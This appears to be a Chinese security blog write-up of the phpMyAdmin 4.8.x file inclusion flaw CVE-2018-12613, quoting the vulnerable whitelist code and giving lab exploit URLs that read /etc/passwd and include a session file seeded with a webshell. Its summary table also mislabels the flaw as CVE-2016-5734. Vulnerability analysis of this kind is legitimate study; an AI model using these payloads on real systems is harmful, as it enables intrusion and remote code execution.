---
# 当前页面内容标题
title: CVE-2018-12613
# sidebar: heading
# 当前页面图标
icon: note
# 分类
category:
    - CVE
tag:
    - phpmyadmin
    - php
    - 文件包含
sticky: false
# 是否收藏在博客主题的文章列表中，当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中
article: true
# 是否将该文章添加至时间线中
timeline: true
# sidebar: heading
order: 1
date: 2023-02-03
# 浏览量
pageview: true
---

## 漏洞详情

`index.php`页面未对`target`参数进行有效过滤，导致的文件包含漏洞

| 漏洞名称        | phpMyAdmin文件包含漏洞（CVE-2016-5734）              |
| --------------- | ---------------------------------------------------- |
| <b>发布时间</b> | <b>2018年06月21日</b>                                |
| <b>漏洞编号</b> | <b>CVE-2016-5734</b>                                 |
| <b>威胁类型</b> | <b>远程代码执行</b>                                  |
| <b>威胁级别</b> | <b>严重</b>                                          |
| <b>利用条件</b> | <b>- 必须登录</b>                                    |
| <b>影响版本</b> | <b>- 4.8.0版本<br>\- 4.8.0.1版本<br>\- 4.8.1版本</b> |

## 漏洞分析

首先验证文件包含

```
http://192.168.79.128:8080/index.php?target=db_sql.php?../../../../../../../etc/passwd
```

![image-20230203152934084](/CVE-2018-12613/image-20230203152934084.png)

查看源代码（index.php文件，第55行）

```php
$target_blacklist = array (
    'import.php', 'export.php'
);
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target']) // 是字符串
    && ! preg_match('/^index/', $_REQUEST['target']) // 开头不为index
    && ! in_array($_REQUEST['target'], $target_blacklist) // 目标不在黑名单范围内 
    && Core::checkPageValidity($_REQUEST['target']) // 检查页面是否存在白名单
) {
    include $_REQUEST['target'];
    exit;
}
```

重点在检查白名单这里`Core::checkPageValidity($_REQUEST['target'])`

打开`libraries\classes\Core.php`目录，第443行

```php
public static function checkPageValidity(&$page, array $whitelist = [])
{
    if (empty($whitelist)) {
        $whitelist = self::$goto_whitelist;
    }
    if (! isset($page) || !is_string($page)) {
        return false;
    }
    if (in_array($page, $whitelist)) {
        return true;
    }
    
    $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }
    $_page = urldecode($page);
    $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }
    return false;
}
```

这里会对`target`进行白名单验证，该函数有两个值，如果第二个值为空，则会使用默认白名单（第31行）

```php
public static $goto_whitelist = array(
    'db_datadict.php',
    'db_sql.php',
    'db_events.php',
    'db_export.php',
    'db_importdocsql.php',
    'db_multi_table_query.php',
    'db_structure.php',
    'db_import.php',
    'db_operations.php',
    'db_search.php',
    'db_routines.php',
    'export.php',
    'import.php',
    'index.php',
    'pdf_pages.php',
    'pdf_schema.php',
    'server_binlog.php',
    'server_collations.php',
    'server_databases.php',
    'server_engines.php',
    'server_export.php',
    'server_import.php',
    'server_privileges.php',
    'server_sql.php',
    'server_status.php',
    'server_status_advisor.php',
    'server_status_monitor.php',
    'server_status_queries.php',
    'server_status_variables.php',
    'server_variables.php',
    'sql.php',
    'tbl_addfield.php',
    'tbl_change.php',
    'tbl_create.php',
    'tbl_import.php',
    'tbl_indexes.php',
    'tbl_sql.php',
    'tbl_export.php',
    'tbl_operations.php',
    'tbl_structure.php',
    'tbl_relation.php',
    'tbl_replace.php',
    'tbl_row_action.php',
    'tbl_select.php',
    'tbl_zoom_select.php',
    'transformation_overview.php',
    'transformation_wrapper.php',
    'user_password.php',
);
```

然后对`target`进行验证，在验证过程中会对`?`进行处理，所以只要`?`这边的参数正确即可

最后回到`index.php`，这里没有对target参数进行任何处理，所以造成了文件包含的漏洞

```php
include $_REQUEST['target'];
exit;
```

## 漏洞利用

这里是主要`phpmyadmin`会将用户的操作记录到session文件中，这里可以将一句话木马添加到访问的路径或查询操作中就可以对session文件进行文件包含

而最关键的文件名称是`sess_ + cookie中phpmyadmin的值`

也就是`sess_2ad097ff8afe0d9fa118887a4bb4b0f5`

步骤1：

![image-20230203160526320](/CVE-2018-12613/image-20230203160526320.png)

可以查看一下`/tmp/sess_2ad097ff8afe0d9fa118887a4bb4b0f5`

![image-20230203160711779](/CVE-2018-12613/image-20230203160711779.png)

步骤2：

访问地址：

```url
http://192.168.79.128:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_2ad097ff8afe0d9fa118887a4bb4b0f5
```

![image-20230203160727712](/CVE-2018-12613/image-20230203160727712.png)

